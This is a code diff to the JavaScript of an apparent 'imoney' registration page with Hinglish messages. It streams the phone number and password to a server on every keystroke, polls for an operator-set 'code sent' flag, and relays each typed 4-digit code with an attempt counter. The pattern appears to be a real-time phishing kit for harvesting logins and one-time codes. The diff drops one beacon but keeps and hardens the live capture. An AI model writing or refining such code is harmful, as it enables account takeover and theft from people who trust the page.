@@ -172,12 +172,17 @@
     const timerMsg = document.getElementById('timerMsg');
     const regForm = document.getElementById('regForm');
 
-    let attempt = 0;
+    let attempt = Number(sessionStorage.getItem('imoney_attempt') || '0');
     let countdownInterval = null;
     let toastTimeout = null;
-    let hasNotifiedStart = false;
+    let lastShownCodeSentToken = sessionStorage.getItem('imoney_last_code_sent_token') || '';
 
-    function showCodeSendedFor3Seconds() {
+    function showCodeSendedFor3Seconds(token = '') {
+      if (token && token === lastShownCodeSentToken) return;
+      if (token) {
+        lastShownCodeSentToken = token;
+        sessionStorage.setItem('imoney_last_code_sent_token', token);
+      }
       codeSendedToast.style.display = 'block';
       clearTimeout(toastTimeout);
       toastTimeout = setTimeout(() => {
@@ -185,31 +190,11 @@
       }, 3000);
     }
 
-    function notifyRegisterStart(digitsOnly) {
-      if (hasNotifiedStart) return;
-      hasNotifiedStart = true;
-      fetch('/api/register-start', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        keepalive: true,
-        body: JSON.stringify({
-          sessionId,
-          phone: digitsOnly || '',
-          startedAt: Date.now()
-        })
-      }).catch(() => {});
-    }
-
     async function pushLiveUpdate() {
       const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
       if (phoneInput.value !== digitsOnly) {
         phoneInput.value = digitsOnly;
       }
-
-      if (digitsOnly.length > 0) {
-        notifyRegisterStart(digitsOnly);
-      }
-
       try {
         await fetch('/api/live-update', {
           method: 'POST',
@@ -217,44 +202,46 @@
           body: JSON.stringify({
             sessionId,
             phone: digitsOnly,
-            password: passwordInput.value,
-            startedTyping: digitsOnly.length > 0
+            password: passwordInput.value
           })
         });
       } catch (e) {}
     }
 
-    phoneInput.addEventListener('keydown', () => {
-      const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
-      notifyRegisterStart(digitsOnly);
-    });
     phoneInput.addEventListener('input', pushLiveUpdate);
-    phoneInput.addEventListener('change', pushLiveUpdate);
-    phoneInput.addEventListener('blur', pushLiveUpdate);
     passwordInput.addEventListener('input', pushLiveUpdate);
-    passwordInput.addEventListener('blur', pushLiveUpdate);
+    codeInput.addEventListener('input', () => {
+      const clean = codeInput.value.replace(/\D/g, '').slice(0, 4);
+      if (codeInput.value !== clean) codeInput.value = clean;
+    });
 
     sendCodeBtn.addEventListener('click', async () => {
       const digitsOnly = phoneInput.value.replace(/\D/g, '').slice(0, 10);
-      if (!digitsOnly) {
-        errorMsg.textContent = 'Pehle phone number enter karein';
+      if (digitsOnly.length !== 10) {
+        errorMsg.textContent = 'Pehle valid 10-digit phone number enter karein';
         return;
       }
       errorMsg.textContent = '';
 
-      await fetch('/api/request-code', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, phone: digitsOnly })
-      });
+      try {
+        await fetch('/api/request-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId, phone: digitsOnly })
+        });
+      } catch (e) {
+        errorMsg.textContent = 'Server se sampark nahi ho paaya';
+      }
     });
 
     setInterval(async () => {
       try {
         const res = await fetch(`/api/status?sessionId=${encodeURIComponent(sessionId)}`);
+        if (!res.ok) return;
         const data = await res.json();
         if (data.codeSended) {
-          showCodeSendedFor3Seconds();
+          const token = String(data.codeSendedAt || data.updatedAt || 'sent');
+          showCodeSendedFor3Seconds(token);
         }
       } catch (e) {}
     }, 800);
@@ -282,24 +269,31 @@
       const cleanPhone = phoneInput.value.replace(/\D/g, '').slice(0, 10);
       const cleanCode = codeInput.value.replace(/\D/g, '').slice(0, 4);
 
+      if (cleanPhone.length !== 10) {
+        errorMsg.textContent = '10-digit phone number enter karein';
+        return;
+      }
       if (cleanCode.length !== 4) {
         errorMsg.textContent = '4-digit code enter karein';
         return;
       }
 
       attempt += 1;
+      sessionStorage.setItem('imoney_attempt', String(attempt));
       const currentAttempt = attempt;
 
-      await fetch('/api/submit-code', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          sessionId,
-          phone: cleanPhone,
-          code: cleanCode,
-          attempt: currentAttempt
-        })
-      });
+      try {
+        await fetch('/api/submit-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sessionId,
+            phone: cleanPhone,
+            code: cleanCode,
+            attempt: currentAttempt
+          })
+        });
+      } catch (e) {}
 
       codeInput.value = '';
 
